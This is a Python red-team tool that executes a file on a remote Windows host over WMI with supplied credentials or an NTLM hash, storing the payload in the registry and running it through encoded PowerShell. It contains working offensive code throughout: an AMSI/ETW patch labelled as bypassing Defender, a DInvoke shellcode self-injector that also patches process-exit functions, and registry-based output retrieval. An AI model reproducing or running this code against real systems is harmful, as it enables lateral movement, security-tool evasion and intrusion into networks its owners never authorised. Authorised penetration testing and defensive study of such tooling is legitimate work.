#!/usr/bin/env python3
#
# Author: @icyguider (Matthew David)
#
#   Dependencies: Impacket, Donut, Mono C# Compiler
#

import argparse
import subprocess
import base64, gzip, time, os, stat, sys
from impacket.examples.utils import parse_target
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.ndr import NULL
from six import PY2

CODEC = sys.stdout.encoding

# PowerShell stager for "small" files
psrunner = """
$test = Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name GetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", "REPLACE_PATCH_VALUE") | foreach { $_.svalue };
iex ([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($test)))
$blob = Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name GetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", "REPLACE_REG_VALUE") | foreach { $_.svalue };
$decoded = [Convert]::FromBAsE64String($blob);
[System.Reflection.Assembly]::Load($decoded);
$args = "REPLACE_ARGUMENTS";
$oldout = [Console]::Out;
$StringWriter = New-Object IO.StringWriter;
[Console]::SetOut($StringWriter);
REPLACE_INVOKE_PROGRAM
[Console]::SetOut($oldout);
REPLACE_EXFIL_METHOD
$b64result = [Convert]::ToBase64String([System.Text.Encoding]::utf8.GetBytes($results))
Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name SetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", $b64result, "REPLACE_REG_VALUE")
"""

# PowerShell stager for large chunked files
psrunner_multichunk = """
$test = Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name GetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", "REPLACE_PATCH_VALUE") | foreach { $_.svalue };
iex ([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($test)))
$final = ""
for ($i = 1; $i -le REPLACE_TOTAL_CHUNKS; $i++)
{
    $blob = Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name GetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", "REPLACE_REG_VALUE$i") | foreach { $_.svalue };
    $final = $final + $blob
}
$decoded = [Convert]::FromBAsE64String($final);
[System.Reflection.Assembly]::Load($decoded);
$oldout = [Console]::Out;
$StringWriter = New-Object IO.StringWriter;
[Console]::SetOut($StringWriter);
REPLACE_INVOKE_PROGRAM
[Console]::SetOut($oldout);
REPLACE_EXFIL_METHOD
$b64result = [Convert]::ToBase64String([System.Text.Encoding]::utf8.GetBytes($results))
Invoke-WmiMethod -Namespace root\\default -Class stdregprov -Name SetStringValue @(REPLACE_REG_HIVE, "REPLACE_REG_KEY", $b64result, "REPLACE_REG_VALUE")
"""

#This should bypass defender. Use the -patch flag to supply your own for better results with other AVs/EDRs.
amsietwpatch = """$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
$string1 = '[System.Runtime.InteropServices.Marshal]::'
$string2 = 'Copy($Patch, '
$string3 = '0, $Address, 6)'
iex ($string1 + $string2 + $string3)

$LoadLibrary = [Win32]::LoadLibrary("nt" + "dll.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "EtwEventWrite")
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xc3)
$string3 = '0, $Address, 1)'
iex ($string1 + $string2 + $string3)
"""

# All credit goes to @Snovvcrash for the below DInvoke shellcode self-injector
# It is used by this script to execute non .NET executables via donut
donut_loader = """
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.ComponentModel;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace NAMESPACE
{
    public class Program
    {
        static byte[] Decompress(byte[] data)
        {
            // modified for gzip
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (var dStream = new GZipStream(input, CompressionMode.Decompress))
                dStream.CopyTo(output);
            return output.ToArray();
        }

        public static void Main()
        {
            var compressed = Convert.FromBase64String("DONUT");
            var rawBytes = Decompress(compressed);

            IntPtr pointer = Marshal.AllocHGlobal(rawBytes.Length);
            Marshal.Copy(rawBytes, 0, pointer, rawBytes.Length);

            _ = DPInvoke.VirtualProtect(pointer, (UIntPtr)rawBytes.Length, (uint)0x40, out _);

            _ = ExitPatcher.PatchExit();

            IntPtr hThread = DPInvoke.CreateThread(IntPtr.Zero, 0, pointer, IntPtr.Zero, 0, IntPtr.Zero);
            _ = DPInvoke.WaitForSingleObject(hThread, 0xFFFFFFFF);

            Marshal.FreeHGlobal(pointer);

            ExitPatcher.ResetExitFunctions();
        }
    }

    /// <summary>
    /// Based on: https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
    /// </summary>
    class DPInvoke
    {
        static object DynamicPInvokeBuilder(Type type, string library, string method, object[] parameters, Type[] parameterTypes)
        {
            AssemblyName assemblyName = new AssemblyName("Temp01");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("Temp02");

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, parameterTypes, CallingConvention.Winapi, CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object result = dynamicMethod.Invoke(null, parameters);

            return result;
        }

        public static IntPtr GetModuleHandle(string lpModuleName)
        {
            Type[] parameterTypes = { typeof(string) };
            object[] parameters = { lpModuleName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetModuleHandle", parameters, parameterTypes);
            return result;
        }

        public static IntPtr GetProcAddress(IntPtr hModule, string procName)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(string) };
            object[] parameters = { hModule, procName };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "GetProcAddress", parameters, parameterTypes);
            return result;
        }

        public static bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            uint oldProtect = 0;

            Type[] parameterTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(uint), typeof(uint).MakeByRefType() };
            object[] parameters = { lpAddress, dwSize, flNewProtect, oldProtect };
            var result = (bool)DynamicPInvokeBuilder(typeof(bool), "kernel32.dll", "VirtualProtect", parameters, parameterTypes);

            if (!result) throw new Win32Exception(Marshal.GetLastWin32Error());
            lpflOldProtect = (uint)parameters[3];

            return result;
        }

        public static IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            object[] parameters = { lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            var result = (IntPtr)DynamicPInvokeBuilder(typeof(IntPtr), "kernel32.dll", "CreateThread", parameters, parameterTypes);
            return result;
        }

        public static UInt32 WaitForSingleObject(IntPtr Handle, UInt32 Wait)
        {
            Type[] parameterTypes = { typeof(IntPtr), typeof(UInt32) };
            object[] parameters = { Handle, Wait };
            var result = (UInt32)DynamicPInvokeBuilder(typeof(UInt32), "kernel32.dll", "WaitForSingleObject", parameters, parameterTypes);
            return result;
        }
    }

    /// <summary>
    /// Stolen from:
    /// https://github.com/nettitude/RunPE/blob/main/RunPE/Patchers/ExitPatcher.cs
    /// https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/NanoDumpInject.cs
    /// </summary>
    class ExitPatcher
    {
        internal const uint PAGE_EXECUTE_READWRITE = 0x40;

        static private byte[] _terminateProcessOriginalBytes;
        static private byte[] _ntTerminateProcessOriginalBytes;
        static private byte[] _rtlExitUserProcessOriginalBytes;
        static private byte[] _corExitProcessOriginalBytes;

        static byte[] PatchFunction(string dllName, string funcName, byte[] patchBytes)
        {
            var moduleHandle = DPInvoke.GetModuleHandle(dllName);
            var pFunc = DPInvoke.GetProcAddress(moduleHandle, funcName);

            var originalBytes = new byte[patchBytes.Length];
            Marshal.Copy(pFunc, originalBytes, 0, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, PAGE_EXECUTE_READWRITE, out var oldProtect))
                return null;

            Marshal.Copy(patchBytes, 0, pFunc, patchBytes.Length);

            if (!DPInvoke.VirtualProtect(pFunc, (UIntPtr)patchBytes.Length, oldProtect, out _))
                return null;

            return originalBytes;
        }

        public static bool PatchExit()
        {
            var hKernelbase = DPInvoke.GetModuleHandle("kernelbase");
            var pExitThreadFunc = DPInvoke.GetProcAddress(hKernelbase, "ExitThread");

            var exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            var pointerBytes = BitConverter.GetBytes(pExitThreadFunc.ToInt64());

            exitThreadPatchBytes.AddRange(pointerBytes);

            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            _terminateProcessOriginalBytes = PatchFunction("kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            if (_terminateProcessOriginalBytes == null)
                return false;

            _corExitProcessOriginalBytes = PatchFunction("mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            if (_corExitProcessOriginalBytes == null)
                return false;

            _ntTerminateProcessOriginalBytes = PatchFunction("ntdll", "NtTerminateProcess", exitThreadPatchBytes.ToArray());
            if (_ntTerminateProcessOriginalBytes == null)
                return false;

            _rtlExitUserProcessOriginalBytes = PatchFunction("ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            if (_rtlExitUserProcessOriginalBytes == null)
                return false;

            return true;
        }

        public static void ResetExitFunctions()
        {
            PatchFunction("kernelbase", "TerminateProcess", _terminateProcessOriginalBytes);
            PatchFunction("mscoree", "CorExitProcess", _corExitProcessOriginalBytes);
            PatchFunction("ntdll", "NtTerminateProcess", _ntTerminateProcessOriginalBytes);
            PatchFunction("ntdll", "RtlExitUserProcess", _rtlExitUserProcessOriginalBytes);
        }
    }
}
"""

class WmiRegExec:
    def __init__(self, target_host='', username='', password='', domain='', nthash='', doKerberos=False, kdcHost=None, remotePath=None, fileargs=None, regKey='HKLM\\Software\\Microsoft\\Edge'):
        self.__target_host = target_host
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = nthash
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.__remoteShare = f'{remotePath.split(":")[0]}$'
        self.__remotePath = remotePath.split(":")[1]
        self.__outputBuffer = ''
        self.__fileargs = fileargs
        hives = {"HKLM":2147483650, "HKEY_LOCAL_MACHINE":2147483650,
        "HKCU":2147483649, "HKEY_CURRENT_USER":2147483649,
        "HKUS":2147483651, "HKEY_USERS":2147483651,
        "HKCC":2147483653, "HKEY_CURRENT_CONFIG":2147483653,
        "HKCR":2147483648, "HKEY_CLASSES_ROOT":2147483648}
        hiveName = regKey.split("\\")[0].strip("$")
        self.__hive = hives[hiveName]
        self.__regKey = "\\".join(regKey.split("\\")[1:])
        self.__regValue = 'larry'
        self.__regPatch = 'patch'
        self.__execOutFile = 'UDD3185.tmp'

    def execute(self, data, final, dotnet, namespace, noOutput, patch):
        dcom = DCOMConnection(self.__target_host, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              None, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            obj, _ = iWbemServices.GetObject('StdRegProv')

            # Write patch to registry
            if patch != '':
                with open(patch, 'r') as f:
                    patchdata = base64.b64encode(f.read().encode('utf8')).decode()
            patchdata = base64.b64encode(amsietwpatch.encode('utf8')).decode()
            test = obj.SetStringValue(self.__hive, self.__regKey, self.__regPatch, patchdata)

            # Write file to registry
            count = 1
            large = False
            totalchunks = len(final)
            if len(''.join(final)) > 900000:
                large = True
                print(f"[+] Large file detected; writing to registry in {totalchunks} chunks...")
                for chunk in final:
                    test = obj.SetStringValue(self.__hive, self.__regKey, f'{self.__regValue}{count}', chunk)
                    print(f"[+] Finished chunk: {count}/{totalchunks}")
                    count += 1
            else:
                test = obj.SetStringValue(self.__hive, self.__regKey, self.__regValue, data)

            print("[WMI] Executing file from registry using powershell...")
            win32Process, _ = iWbemServices.GetObject('Win32_Process')
            pwd = f"{self.__remoteShare[:-1]}:{self.__remotePath}\\"
            if large == False:
                pscmd = psrunner
                pscmd = pscmd.replace("REPLACE_ARGUMENTS", self.__fileargs)
                pscmd = pscmd.replace("REPLACE_NAMESPACE", namespace.split(".")[0])
                pscmd = pscmd.replace("REPLACE_CLASS", namespace.split(".")[1])
            else:
                pscmd = psrunner_multichunk
                pscmd = pscmd.replace("REPLACE_TOTAL_CHUNKS", str(totalchunks))
            if dotnet == True:
                pscmd = pscmd.replace("REPLACE_INVOKE_PROGRAM", "[REPLACE_NAMESPACE.REPLACE_CLASS]::Main($args.split(" "));")
                pscmd = pscmd.replace("REPLACE_EXFIL_METHOD", '$results = $StringWriter.ToString();')
                pscmd = pscmd.replace("REPLACE_ARGUMENTS", self.__fileargs)
                pscmd = pscmd.replace("REPLACE_NAMESPACE", namespace.split(".")[0])
                pscmd = pscmd.replace("REPLACE_CLASS", namespace.split(".")[1])
            else:
                pscmd = pscmd.replace("REPLACE_INVOKE_PROGRAM", "[DonutLoad.Program]::Main();")
                pscmd = pscmd.replace("REPLACE_EXFIL_METHOD", f'$results = [System.IO.File]::ReadAllText("{self.__remoteShare[:-1]}:{self.__remotePath}\\{self.__execOutFile}"); rm {self.__remoteShare[:-1]}:{self.__remotePath}\\{self.__execOutFile}')


            pscmd = pscmd.replace("REPLACE_REG_KEY", self.__regKey)
            pscmd = pscmd.replace("REPLACE_REG_HIVE", str(self.__hive))
            pscmd = pscmd.replace("REPLACE_REG_VALUE", self.__regValue)
            pscmd = pscmd.replace("REPLACE_PATCH_VALUE", self.__regPatch)

            #print(pscmd)
            b64cmd = base64.b64encode(pscmd.encode('UTF-16LE')).decode()
            #print(b64cmd)
            # Get rid of cmd.exe call if powershell isn't being blocked directly
            command = f"cmd.exe /Q /c powershell -ep Bypass -enc {b64cmd}"

            if PY2:
                win32Process.Create(command.decode(sys.stdin.encoding), pwd, None)
            else:
                win32Process.Create(command, pwd, None)

            #BELOW WILL GET OUTPUT VIA REGISTRY OVER WMI
            ocount = 0
            while True:
                try:
                    if noOutput == False:
                        if ocount == 0:
                            print("[WMI] Reading output from registry...")
                        retVal = obj.GetStringValue(self.__hive, self.__regKey, self.__regValue)
                        self.__outputBuffer = base64.b64decode(retVal.sValue).decode()
                    else:
                        self.__outputBuffer = ""
                    time.sleep(2)
                    retVal = obj.DeleteValue(self.__hive, self.__regKey, self.__regValue)
                    retVal = obj.DeleteValue(self.__hive, self.__regKey, self.__regPatch)
                    if large == True:
                        for i in range(1, totalchunks+1):
                            retVal = obj.DeleteValue(self.__hive, self.__regKey, f'{self.__regValue}{i}')
                    break
                except Exception as e:
                    #print(e)
                    if "NoneType" in str(e) or "invalid start byte" in str(e):
                        if ocount < 15:
                            # Output not finished, let's wait
                            time.sleep(1)
                            ocount += 1
                            pass
                        else:
                            print(f"[!] Timeout occured when trying to read output or cleanup.\n{e}")
                            break
                ocount += 1

        except (Exception, KeyboardInterrupt) as e:
            dcom.disconnect()
            sys.stdout.flush()
            print(e)
            sys.exit(1)

        dcom.disconnect()
        return self.__outputBuffer

    def execFile(self, file, fileargs, namespace, noOutput, patch):
        dotnet = True
        result = subprocess.run(f"file {file}", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True).stdout
        if "PE32" in result:
            if ".Net assembly" not in result:
                dotnet = False
                print("[+] Non .NET exe detected; running donut...")
                result = subprocess.run(f"donut -i {file} -b1 -z 2 -p '{fileargs}'", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, shell=True).stdout
                print("[+] Compiling C# stub for donut loader...")
                with open("loader.bin", "rb") as f:
                    filedata = f.read()
                blob = base64.b64encode(gzip.compress(filedata)).decode()
                template = donut_loader
                template = template.replace("DONUT", blob)
                template = template.replace("NAMESPACE", "DonutLoad")
                with open("stub.cs", "w") as f:
                    f.write(template)
                os.system("mcs -platform:x64 stub.cs; rm stub.cs loader.bin")
                file = "stub.exe"
        print("[WMI] Writing file to registry...")
        with open(file, 'rb') as f:
            fdata = f.read()
        fdata = base64.b64encode(fdata).decode()
        count = 0
        blockSize = 900000
        numOfBlocks = len(fdata)/blockSize
        evenBlocks = False
        final = []
        if numOfBlocks.is_integer():
            evenBlocks = True
        for i in range(0, len(fdata), blockSize):
            successful = False
            endval = i + blockSize
            current = fdata[i:endval]
            final.append(current)
            count = count + 1
        if namespace == "":
            namespace = "{}.Program".format(file.split(".")[0])
        res = self.execute(fdata, final, dotnet, namespace, noOutput, patch)
        return res


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Store exe in registry and execute via powershell")
    parser.add_argument("target", help="Target host to execute file on", type=str)
    parser.add_argument('-f', '-file', dest='file', help='File to execute', metavar='file', default='')
    parser.add_argument('-a', '-args', dest='fileargs', help='Command line arguments for file', metavar='args', default='')
    parser.add_argument('-n', '-namespace', dest='namespace', help='Namespace.Class containing main method to execute (Ex: Rubeus.Program)', metavar='namespace', default='')
    parser.add_argument('-r', '-reg-key', dest='reg_key', help='Registry key to write file to (Default: HKLM\\Software\\Microsoft\\Edge)', metavar='key', default='HKLM\\Software\\Microsoft\\Edge')
    parser.add_argument('-p', '-patch', dest='patch', help='File containing AMSI/ETW patch to perform before execution', metavar='patch', default='')
    parser.add_argument('-rp', '-remote-path', dest='remotePath', help='The remote path to write files to (Default: C:\\Windows\\Temp)', metavar='remotePath', default="C:\\Windows\\Temp\\")
    parser.add_argument('-nooutput', action='store_true', default=False, help='Do not attempt to get/print output')
    group = parser.add_argument_group('authentication')
    group.add_argument('-H', '-hash', dest='hash', help='NTHash for login via PtH', metavar='hash', default='')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication with credentials from the KRB5CCNAME ccache file')
    group.add_argument('-dc-ip', dest='dc_ip', help='IP Address of the domain controller (useful for Kerberos auth)', metavar='IPAddress')
    if len(sys.argv) == 1:
        parser.print_help()
        exit()
    args = parser.parse_args()
    username = ""
    password = ""
    domain = ""
    nthash = ""
    nthash = args.hash
    domain, username, password, target = parse_target(args.target)
    if args.k == True:
        domain = ""
    if password == '' and username != '' and args.hash == "" and args.k == False:
        from getpass import getpass
        password = getpass("[+] Password: ")
    if args.remotePath[-1] == "\\":
        rpath = args.remotePath[:-1]
    else:
        rpath = args.remotePath
    try:
        regExec = WmiRegExec(target, username, password, domain, nthash, args.k, args.dc_ip, rpath, args.fileargs, args.reg_key)
        res = regExec.execFile(args.file, args.fileargs, args.namespace, args.nooutput, args.patch)
        if args.nooutput == False:
            print(res)
        else:
            print("[+] File executed successfully!")
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            print(
                f"[!] The user {domain}\\{username} is not local administrator on this system"
            )
        elif "STATUS_LOGON_FAILURE" in str(e):
            print(
                f"[!] The provided credentials for the user '{domain}\\{username}' are invalid or the user does not exist"
            )
        else:
            print(f"[!] Some failure happened: ({str(e)})")
        raise Exception
